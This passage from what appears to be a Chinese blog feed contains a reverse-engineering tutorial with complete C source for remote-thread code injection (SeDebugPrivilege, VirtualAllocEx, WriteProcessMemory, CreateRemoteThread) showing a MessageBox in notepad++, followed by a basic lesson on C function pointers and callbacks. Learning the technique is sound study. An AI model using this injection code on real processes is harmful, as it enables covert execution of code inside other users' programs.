id="线程函数实现调用"><a class="header-anchor" href="#线程函数实现调用">¶</a>线程函数实现调用</h2><p>开启线程后会调用线程函数，把我们写入进程内存中的信息读取到要调用的函数中，最后实现调用</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里的WINAPI是调用约定，相当于__stdcall</span></span><br><span class="line"><span class="comment">//线程函数，线程开始的地方</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lParam)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC         pFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LoadLibrary()，将pFunc[0]强制转换为这样类型的函数指针，pParam-&gt;szBuf[0]是该函数的参数</span></span><br><span class="line">    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);    <span class="comment">// "user32.dll"，第二个括号内的是函数的参数</span></span><br><span class="line">    <span class="keyword">if</span> (!hMod)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GetProcAddress()，返回值是回调函数，pFunc就是函数指针</span></span><br><span class="line">    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);  <span class="comment">// "MessageBoxA" ，获取到MessageBoxA的地址 </span></span><br><span class="line">    <span class="keyword">if</span> (!pFunc)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MessageBoxA()  </span></span><br><span class="line">    ((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);<span class="comment">//最后的调用</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="0x02-代码实现"><a class="header-anchor" href="#0x02-代码实现">¶</a>0x02-代码实现</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个存储线程信息的结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_PARAM</span>//定义线程信息</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    FARPROC pFunc[<span class="number">2</span>];               <span class="comment">// LoadLibraryA(), GetProcAddress()  </span></span><br><span class="line">    <span class="keyword">char</span>    szBuf[<span class="number">4</span>][<span class="number">128</span>];          <span class="comment">// "user32.dll", "MessageBoxA", "www.reversecore.com", "ReverseCore"  </span></span><br><span class="line">} THREAD_PARAM, * PTHREAD_PARAM;<span class="comment">//分别是线程信息块和指向线程信息的指针</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义函数指针，方便调用HOMDULE是返回值，WINAPI也就是__stdcall，是调用约定，类型名为PFLOADLIBRARYA，lpLivFileName是参数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI *PFLOADLIBRARYA)</span><span class="params">(LPCSTR lpLibFileName)</span></span>;<span class="comment">//前面的是返回值，中间是类型</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI *PFGETPROCADDRESS)</span><span class="params">(HMODULE hModule,LPCSTR lpProcName)</span></span>;<span class="comment">//返回值是一个回调函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *PFMESSAGEBOXA)</span><span class="params">(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里的WINAPI是调用约定，相当于__stdcall</span></span><br><span class="line"><span class="comment">//线程函数，线程开始的地方</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lParam)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    PTHREAD_PARAM   pParam = (PTHREAD_PARAM)lParam;</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC         pFunc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LoadLibrary()，将pFunc[0]强制转换为这样类型的函数指针，pParam-&gt;szBuf[0]是该函数的参数</span></span><br><span class="line">    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);    <span class="comment">// "user32.dll"，第二个括号内的是函数的参数</span></span><br><span class="line">    <span class="keyword">if</span> (!hMod)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// GetProcAddress()，返回值是回调函数，pFunc就是函数指针</span></span><br><span class="line">    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);  <span class="comment">// "MessageBoxA" ，获取到MessageBoxA的地址 </span></span><br><span class="line">    <span class="keyword">if</span> (!pFunc)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MessageBoxA()  </span></span><br><span class="line">    ((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);<span class="comment">//最后的调用</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectCode</span><span class="params">(DWORD dwPID)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    HMODULE         hMod = <span class="literal">NULL</span>;</span><br><span class="line">    THREAD_PARAM    param = { <span class="number">0</span>, };</span><br><span class="line">    HANDLE          hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE          hThread = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID          pRemoteBuf[<span class="number">2</span>] = { <span class="number">0</span>, };</span><br><span class="line">    DWORD           dwSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//先给线程信息块赋值 </span></span><br><span class="line">    param.pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">    param.pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">"GetProcAddress"</span>);<span class="comment">//因为kernel32在内存中优先被装载，所以在不同进程中都一样</span></span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">0</span>], <span class="string">"user32.dll"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">1</span>], <span class="string">"MessageBoxA"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">2</span>], <span class="string">"InjectCode Success!!"</span>);</span><br><span class="line">    strcpy_s(param.szBuf[<span class="number">3</span>], <span class="string">"Hint"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//开启进程  </span></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID)))              </span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcess() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//为注入的线程信息块中的第一个函数开辟内存 </span></span><br><span class="line">    dwSize = <span class="keyword">sizeof</span>(THREAD_PARAM);</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess,<span class="literal">NULL</span>,dwSize,MEM_COMMIT,PAGE_READWRITE)))    </span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//写入线程信息块中函数的值和参数到进程中</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,pRemoteBuf[<span class="number">0</span>],(LPVOID)&amp;param,dwSize,<span class="literal">NULL</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//再次开辟  </span></span><br><span class="line">    dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;</span><br><span class="line">    <span class="keyword">if</span> (!(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess,<span class="literal">NULL</span>,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"VirtualAllocEx() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//函数调用</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess,pRemoteBuf[<span class="number">1</span>],(LPVOID)ThreadProc,dwSize,<span class="literal">NULL</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"WriteProcessMemory() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//开启远程线程，LPTHREAD_START_ROUTINE指向一个回调函数，pRemoteBuf[1]是函数，pRemoteBufe[0]是函数的值和参数</span></span><br><span class="line">    <span class="keyword">if</span> (!(hThread = CreateRemoteThread(hProcess,<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>],pRemoteBuf[<span class="number">0</span>],<span class="number">0</span>,<span class="literal">NULL</span>)))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"CreateRemoteThread() fail : err_code = %d\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">        &amp;hToken))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"OpenProcessToken error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system  </span></span><br><span class="line">        lpszPrivilege,  <span class="comment">// privilege to lookup   </span></span><br><span class="line">        &amp;luid))        <span class="comment">// receives LUID of privilege  </span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"LookupPrivilegeValue error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.  </span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"AdjustTokenPrivileges error: %u\n"</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"The token does not have the specified privilege. \n"</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    DWORD dwPID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n USAGE  : %s &lt;pid&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//进程提权</span></span><br><span class="line">    <span class="keyword">if</span> (!SetPrivilege(SE_DEBUG_NAME, TRUE))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//code injection  </span></span><br><span class="line">    dwPID = (DWORD)atol(argv[<span class="number">1</span>]);</span><br><span class="line">    dwPID = <span class="number">9432</span>;</span><br><span class="line">    InjectCode(dwPID);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="0x03-最终效果"><a class="header-anchor" href="#0x03-最终效果">¶</a>0x03-最终效果</h1><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649916449939.png" alt></p><h1 id="0x04-代码注入调试练习"><a class="header-anchor" href="#0x04-代码注入调试练习">¶</a>0x04-代码注入调试练习</h1><p>先使用OD打开notepad++，并F9直至notepad++处于运行状态</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922555004.png" alt="进行设置"></p><p>然后查看notepad++ PID并注入</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922580481.png" alt></p><p>注入之后会断在ThreadProc函数</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922621425.png" alt></p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922671867.png" alt></p><p>在x32中</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649923028194.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;代码注入&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>基础知识补充</title>
    <link href="https://gift1a.github.io/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/"/>
    <id>https://gift1a.github.io/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/</id>
    <published>2022-04-11T07:59:14.000Z</published>
    <updated>2022-05-11T12:27:34.778Z</updated>
    
    <content type="html"><![CDATA[<p>一些基础知识的补充</p><span id="more"></span> <h1 id="0x00-typedef定义函数指针"><a class="header-anchor" href="#0x00-typedef定义函数指针">¶</a>0x00-typedef定义函数指针</h1><h2 id="函数指针"><a class="header-anchor" href="#函数指针">¶</a>函数指针</h2><p>在此之前我们要先了解函数指针，即存放函数首地址的变量，而函数名就是函数的首地址，为了存放函数的首地址就需要定义函数指针</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is hello!"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="comment">//函数指针定义</span></span><br><span class="line"><span class="keyword">void</span> (*fp)()=hello;<span class="comment">//函数指针定义时应保证函数返回值与参数个数、类型相同，在这里void是返回类型，(*fp)后面的()是函数参数</span></span><br><span class="line"><span class="comment">/*也可以理解为</span></span><br><span class="line"><span class="comment">void (*fp)();</span></span><br><span class="line"><span class="comment">fp=hello;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过函数指针调用函数</span></span><br><span class="line">fp();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数指针定义,形参可以不写变量名</span></span><br><span class="line"><span class="keyword">int</span> (*fp1)(<span class="keyword">int</span>,<span class="keyword">int</span>)=add;</span><br><span class="line"><span class="comment">//函数调用</span></span><br><span class="line">fp1(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></tbody></table></figure><h2 id="typedef与函数指针混合使用"><a class="header-anchor" href="#typedef与函数指针混合使用">¶</a>typedef与函数指针混合使用</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*FP)</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>那么我们在赋值的时候就可以改成</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FP fp1=add;<span class="comment">//fp1就是返回值为int型，参数为两个int型的函数指针，FP表示函数指针的类型，通过类型名+变量名就可以定义函数指针</span></span><br><span class="line">fp1(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></tbody></table></figure><h1 id="0x01-回调函数"><a class="header-anchor" href="#0x01-回调函数">¶</a>0x01-回调函数</h1><h2 id="定义"><a class="header-anchor" href="#定义">¶</a>定义</h2><p>如果函数的参数具有函数指针，那么这样的函数就被称为回调函数</p><p>函数指针就是当作接口使用的</p><h2 id="例子-v3"><a class="header-anchor" href="#例子-v3">¶</a>例子</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里的call就是回调函数,这里传递函数指针和我们传入数组时使用函数指针是类似的，都是使用指针将首地址进行传递，而不是传整个函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call</span><span class="params">(<span class="keyword">void</span>(*fp)())</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    fp();<span class="comment">//这样调用的时候就不需要考虑函数指针的变量名，只要传递的函数是这样类型的即可在call函数中进行调用</span></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//当然也可以使用typedef，让回调函数更简洁</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*fp)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">call</span><span class="params">(fp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    fp();</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"show"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="comment">//如果不使用回调函数，调用时需要hello();show();</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    call(show);</span><br><span class="line">    call(hello);<span class="comment">//使用回调函数调用，这样只需要传入不同参数即可完成调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="0x02-复杂函数"><a class="header-anchor" href="#0x02-复杂函数">¶</a>0x02-复杂函数</h1><p>定义复杂的回调函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">handle</span><span class="params">(<span class="keyword">void</span>*arg)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"arg is %X\n"</span>,arg);</span><br><span class="line">    <span class="keyword">return</span> arg;<span class="comment">//返回值是void*</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//我们要定义一个参数为函数指针，返回值为函数指针的回调函数</span></span><br><span class="line"><span class="comment">//先来看参数，传入函数指针void* (*fp)(void 